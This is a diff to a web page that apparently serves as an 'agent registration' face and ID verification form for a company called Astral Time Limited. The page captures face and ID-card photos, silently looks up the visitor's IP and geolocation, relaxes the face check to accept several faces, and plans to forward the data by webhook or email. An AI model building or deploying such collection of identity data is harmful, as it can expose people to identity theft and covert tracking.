@@ -41,8 +41,8 @@ button:hover {
 }
 video {
   margin-top: 20px;
-  width: 300px;
-  height: 300px;
+  width: 360px;
+  height: 360px;
   object-fit: cover;
   border-radius: 50%;
   border: 5px solid #007bff;
@@ -53,6 +53,12 @@ p#status {
   margin-top: 20px;
   font-size: 14px;
   color: red;
+}
+.notice {
+  margin-top: 15px;
+  font-size: 12px;
+  color: #555;
+  text-align: center;
 }
 footer {
   margin-top: 30px;
@@ -66,6 +72,8 @@ footer {
 <div class="container">
 <h2>Astral Time Limited</h2>
 <h3>Agent Registration - Face & ID Verification</h3>
+
+<div class="notice">请保持光线充足，对准脸部取景框拍摄！</div>
 
 <button onclick="startCamera()" id="startBtn">Start Camera</button>
 <video id="video" style="display:none;" autoplay playsinline></video>
@@ -90,7 +98,7 @@ footer {
 
 <footer>Copyright © 2025 Astral Time Limited. All rights reserved.</footer>
 </div>
-<script>
+  <script>
 let failCount = 0;
 let idFrontImage = '';
 let idBackImage = '';
@@ -112,7 +120,7 @@ function startCamera() {
   });
 
   // 抓取IP地址和地理位置
-  fetch('https://ipinfo.io?token=your_ipinfo_token') // 这里填你申请的IPinfo token
+  fetch('https://ipinfo.io?token=your_ipinfo_token')  // 替换your_ipinfo_token为你申请的Token
     .then(response => response.json())
     .then(data => {
       ipInfo = data;
@@ -126,8 +134,8 @@ function captureFace() {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
-  canvas.width = 300;
-  canvas.height = 300;
+  canvas.width = 360;
+  canvas.height = 360;
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
   faceImage = canvas.toDataURL('image/jpeg').split(',')[1];
@@ -139,7 +147,7 @@ function captureFace() {
   })
   .then(response => response.json())
   .then(data => {
-    if (data.faces && data.faces.length === 1) {
+    if (data.faces && data.faces.length >= 1) { // 只要检测到至少一张脸就通过
       document.getElementById('registerForm').style.display = 'flex';
       document.getElementById('status').innerText = "Face verification success! Please continue.";
     } else {
@@ -161,8 +169,8 @@ function captureID(side) {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
-  canvas.width = 300;
-  canvas.height = 300;
+  canvas.width = 360;
+  canvas.height = 360;
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
   const image = canvas.toDataURL('image/jpeg').split(',')[1];
@@ -207,6 +215,8 @@ document.getElementById('registerForm').addEventListener('submit', function(e) {
   console.log("Registration Data Ready:", registrationData);
 
   alert("Registration submitted!\n(Next Step: send data to server or email manually.)");
+
+  // TODO: 这里可以加发送到服务器/Make.com webhook 发Email
 });
 </script>
 </body>
